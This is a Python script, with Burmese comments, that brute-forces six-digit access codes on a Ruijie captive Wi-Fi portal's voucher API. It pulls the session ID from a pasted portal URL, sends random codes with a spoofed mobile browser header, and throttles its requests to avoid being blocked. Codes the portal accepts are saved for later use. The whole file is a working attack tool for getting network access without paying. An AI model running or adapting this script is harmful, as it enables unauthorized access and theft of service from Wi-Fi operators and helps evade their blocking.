import requests
import random
import time
import os
import sys

# UI Colors
G = '\033[92m'  # Green
R = '\033[91m'  # Red
Y = '\033[93m'  # Yellow
C = '\033[96m'  # Cyan
W = '\033[0m'   # White

def banner():
    os.system('clear')
    print(f"""
{Y}╔════════════════════════════════════════╗
║    {G}RUIJIE 6-DIGIT VOUCHER ENGINE v10.0 {Y}║
║    {C}No License Needed • Pure Python     {Y}║
╚════════════════════════════════════════╝{W}
    """)

def brute_force_engine(sid, api_url):
    print(f"{G}[*] Engine Started...{W}")
    print(f"{C}[*] Target SID: {sid[:15]}...{W}")
    
    tested_count = 0
    # ဂဏန်း ၆ လုံး ပတ်မည့် ပုံစံ (Random ပတ်ခြင်းက ပိုထိရောက်ပါသည်)
    while True:
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json;charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        payload = {
            "accessCode": code, 
            "sessionId": sid, 
            "apiVersion": 1
        }

        try:
            res = requests.post(api_url, json=payload, headers=headers, timeout=7)
            tested_count += 1
            
            # Status 200 ပြန်လာလျှင် ကုဒ်မှန်ဖြစ်နိုင်ခြေ ရှိသည်
            if res.status_code == 200:
                print(f"\n{G}[SUCCESS] VALID CODE FOUND: {code}{W}")
                print(f"{Y}[!] Try this code in your browser immediately!{W}")
                
                with open("found_vouchers.txt", "a") as f:
                    f.write(f"Code: {code} | Date: {time.ctime()}\n")
                
                # ကုဒ်တွေ့လျှင် ခေတ္တရပ်ပေးမည်
                input(f"\n{C}Press Enter to continue scanning...{W}")
            else:
                print(f"{W}[{tested_count}] Testing: {code} {R}[Invalid]{W}", end="\r")

            # Stealth Delay (Block မခံရစေရန် ၂ စက္ကန့် ခြားပါသည်)
            time.sleep(2)

        except KeyboardInterrupt:
            print(f"\n{R}[!] Stopped by user.{W}")
            break
        except Exception as e:
            print(f"\n{R}[!] Connection Error. Retrying in 5s...{W}")
            time.sleep(5)

def main():
    banner()
    url = input(f"{C}Paste Portal URL (with sessionId): {W}").strip()
    
    if "sessionId=" in url:
        try:
            import re
            from urllib.parse import urlparse
            sid = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', url).group(1)
            parsed = urlparse(url)
            api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
            
            brute_force_engine(sid, api_url)
        except Exception as e:
            print(f"{R}[!] URL Format Error!{W}")
    else:
        print(f"{R}[!] No Session ID found in URL!{W}")

if __name__ == "__main__":
    main()
